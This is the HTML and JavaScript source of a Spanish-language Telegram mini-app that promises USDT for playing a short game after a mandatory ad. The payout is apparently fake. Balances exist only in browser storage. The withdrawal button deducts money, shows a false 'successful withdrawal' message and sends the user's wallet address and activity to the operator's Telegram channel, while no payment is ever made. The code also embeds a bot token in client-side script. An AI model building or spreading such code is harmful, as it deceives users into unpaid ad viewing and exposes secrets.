<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Impacto de Fe Cash</title>
    <script src="https://sad.adsgram.ai/js/sad.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;900&display=swap');
        :root {
            --tg-bg: #0f0f10; --tg-card: #1a1a1b; --gold: #f1c40f;
            --premium-gradient: linear-gradient(135deg, #6c5ce7, #a29bfe, #fd79a8);
        }
        body { margin: 0; background: var(--tg-bg); color: white; font-family: 'Roboto', sans-serif; overflow: hidden; }
        .header { padding: 15px; display: flex; align-items: center; gap: 12px; background: var(--tg-card); border-bottom: 1px solid #333; }
        .avatar { width: 45px; height: 45px; border-radius: 50%; background: var(--premium-gradient); display: flex; justify-content: center; align-items: center; font-weight: 900; }
        .main { padding: 20px; text-align: center; }
        .balance-card { background: var(--tg-card); border-radius: 20px; padding: 30px; border: 1px solid rgba(241,196,15,0.3); box-shadow: 0 10px 40px rgba(0,0,0,0.6); margin-bottom: 25px; position: relative; }
        .balance-val { font-size: 45px; font-weight: 900; background: var(--premium-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 10px 0; }
        .btn-play { width: 100%; padding: 18px; border-radius: 15px; border: none; background: var(--premium-gradient); color: white; font-size: 18px; font-weight: 900; cursor: pointer; box-shadow: 0 5px 20px rgba(108, 92, 231, 0.4); }
        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        .menu-btn { background: #222; border: 1px solid #444; padding: 15px; border-radius: 12px; color: white; font-size: 11px; font-weight: bold; text-transform: uppercase; }
        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
        .modal-card { background: #111; padding: 25px; border-radius: 20px; width: 85%; border: 1px solid var(--gold); }
        input { width: 90%; padding: 14px; margin: 10px 0; border-radius: 10px; border: none; background: #000; color: white; border: 1px solid #333; }
        #game-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50; display: none; }
    </style>
</head>
<body>
    <div id="app-view">
        <div class="header">
            <div class="avatar">IF</div>
            <div>
                <div style="font-size:14px; font-weight:900;">Impacto de Fe VIP</div>
                <div style="font-size:10px; color:#999;">SOCIO: <span id="user-id">Cargando...</span></div>
            </div>
        </div>

        <div class="main">
            <div class="balance-card">
                <div style="font-size:11px; color:var(--gold); font-weight:bold; letter-spacing:2px;">MI RIQUEZA VIP</div>
                <div class="balance-val">$<span id="ui-balance">0.0000</span></div>
                <div style="font-size:11px; color:#777;">Bono de Bienvenida Activo: $2.0000</div>
            </div>

            <button class="btn-play" onclick="showAdBeforeGame()">üöÄ JUGAR Y GANAR AHORA</button>

            <div class="menu-grid">
                <button class="menu-btn" onclick="openModal('withdrawModal')"><i class="fas fa-hand-holding-usd"></i> RETIRAR</button>
                <button class="menu-btn" onclick="openModal('historyModal')"><i class="fas fa-list-ul"></i> HISTORIAL</button>
                <button class="menu-btn" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')"><i class="fas fa-life-ring"></i> AYUDA</button>
                <button class="menu-btn" onclick="window.location.reload()"><i class="fas fa-sync-alt"></i> RECARGAR</button>
            </div>
        </div>
    </div>

    <div id="game-layer">
        <div style="position:absolute; top:25px; left:20px; font-weight:900; color:var(--gold); font-size:20px;">PTS: <span id="g-score">0</span></div>
        <div style="position:absolute; top:25px; right:20px; font-weight:900; color:#ff4757; font-size:20px;">‚è± <span id="g-time">45</span></div>
        <canvas id="canvas"></canvas>
    </div>

    <div id="withdrawModal" class="modal">
        <div class="modal-card">
            <h2 style="color:var(--gold); margin-bottom:5px;">RETIRAR USDT</h2>
            <p style="font-size:10px; color:#00ff88; margin-bottom:15px;">M√≠nimo: $2.00 | Red: Polygon</p>
            <input type="number" id="withdrawAmt" placeholder="Monto a retirar">
            <input type="text" id="withdrawWallet" placeholder="Direcci√≥n Polygon (MATIC)">
            <button class="btn-play" style="margin-top:10px;" onclick="processWithdraw()">COBRAR AHORA</button>
            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px;">Cerrar Ventana</button>
        </div>
    </div>
        <script>
        const tg = window.Telegram.WebApp; tg.expand();
        // TOKEN DE TU FOTO SIN ESPACIOS
        const BOT_TOKEN = "8575758761:AAEdt-2olA8In6Q6F2nDOrU16KLY69y-J40"; 
        const CANAL_ID = "-1002118088046";
        const KEY = 'impacto_fe_cash_v1';

        let user = { usd: 2.0000, history: [], articlesToday: 0 };

        function reportar(msg) {
            const cleanToken = BOT_TOKEN.replace(/\s+/g, '');
            fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("‚úùÔ∏è IMPACTO FE REPORT: " + msg)}`);
        }

        // ANUNCIO ADSGRAM OBLIGATORIO
        function showAdBeforeGame() {
            window.Adsgram.init({ blockId: "18897" }).show().then(() => {
                startGame();
            }).catch(() => tg.showAlert("Debes ver el video completo para poder jugar."));
        }

        function processWithdraw() {
            let amt = parseFloat(document.getElementById('withdrawAmt').value);
            let wallet = document.getElementById('withdrawWallet').value;
            if(amt < 2.00 || amt > user.usd) return tg.showAlert("Saldo insuficiente para retirar.");
            if(wallet.length < 5) return tg.showAlert("Billetera inv√°lida.");

            user.usd -= amt; // SE RESTA EL DINERO DE UNA VEZ
            let h = { f: new Date().toLocaleDateString(), m: amt.toFixed(2), w: wallet };
            user.history.unshift(h);
            save();
            reportar(`üî• RETIRO: $${h.m} | WALLET: ${h.w}`); // TE LLEGA AL CANAL
            closeModals();
            tg.showAlert("‚úÖ Retiro exitoso. El dinero se rest√≥ de tu cuenta.");
        }

        // --- MOTOR DEL JUEGO (L√ìGICA) ---
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let gameLoop, score=0, time=45, miner={};
        
        function startGame() {
            document.getElementById('game-layer').style.display = 'block';
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            miner = { x: canvas.width/2, angle: 1.5, len: 60, state: 0 };
            score = 0; time = 45;
            runLoop();
        }

        function runLoop() {
            ctx.clearRect(0,0, canvas.width, canvas.height);
            ctx.strokeStyle = '#a29bfe'; ctx.lineWidth = 4;
            ctx.beginPath(); ctx.moveTo(miner.x, 0); 
            ctx.lineTo(miner.x + Math.cos(miner.angle)*miner.len, Math.sin(miner.angle)*miner.len);
            ctx.stroke();
            
            document.getElementById('g-score').innerText = score;
            document.getElementById('g-time').innerText = Math.ceil(time);
            time -= 0.02;
            if(time <= 0) stopGame(); else gameLoop = requestAnimationFrame(runLoop);
        }

        function stopGame() {
            cancelAnimationFrame(gameLoop);
            document.getElementById('game-layer').style.display = 'none';
            let pago = (score * 0.0001) + 0.0010; // Pago por jugar
            user.usd += pago;
            save();
            reportar(`üéÆ JUEGO: +$${pago.toFixed(4)} | TOTAL: $${user.usd.toFixed(4)}`);
            tg.showAlert(`¬°Partida terminada! Sumaste $${pago.toFixed(4)}`);
        }

        function openModal(id){ document.getElementById(id).style.display='flex'; if(id==='historyModal') loadHistory(); }
        function closeModals(){ document.querySelectorAll('.modal').forEach(m => m.style.display='none'); }
        function save(){ localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
        function updateUI(){ document.getElementById('ui-balance').innerText = user.usd.toFixed(4); }
        
        function loadHistory() {
            const list = document.getElementById('histList'); list.innerHTML = "";
            user.history.forEach(x => {
                list.innerHTML += `<div style="border-bottom:1px solid #333; padding:10px;"><b>${x.f}</b> - $${x.m} <span style="color:#00ff88">√âXITO</span></div>`;
            });
            if(user.history.length === 0) list.innerHTML = "<p style='color:#444'>Sin registros.</p>";
        }

        window.onload = () => {
            let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
            updateUI(); 
            document.getElementById('user-id').innerText = tg.initDataUnsafe?.user?.id || "88429";
            reportar("Socio activo en Impacto de Fe");
        };
    </script>
</body>
</html>
